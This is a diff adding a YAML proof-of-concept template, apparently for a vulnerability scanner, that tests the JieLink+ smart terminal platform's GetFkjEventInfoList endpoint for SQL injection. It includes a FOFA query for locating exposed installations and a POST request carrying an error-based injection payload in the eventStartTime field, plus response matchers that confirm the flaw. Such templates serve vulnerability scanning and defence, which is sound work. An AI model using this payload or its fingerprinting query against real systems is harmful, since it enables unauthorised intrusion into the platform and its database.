@@ -1,0 +1,21 @@
+id: poc-yaml-jielink-plus-getfkjeventinfolist-sqli
+info:
+  name: JieLink+智能终端操作平台 GetFkjEventInfoList SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: JeLink+
+  fofa: title="JieLink+智能终端操作平台"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /report/fkj/GetFkjEventInfoList
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: eventStartTime=' AND EXTRACTVALUE(4817,CONCAT(0x7e,md5({{.t1}}),0x7e)) AND
+    'qVLu'='qVLu&eventEndTime=&deviceIp=&deviceName=&eventTypeName=&eventContent=&page=1&rows=20
+  expression: "status_code == 200 && \ncontains(body,\"location.href\") &&\ncontains(body,substr(t2,0,31))\
+    \ &&\ncontains(body,\"XPATH+syntax+error\")\n"
+transport: http
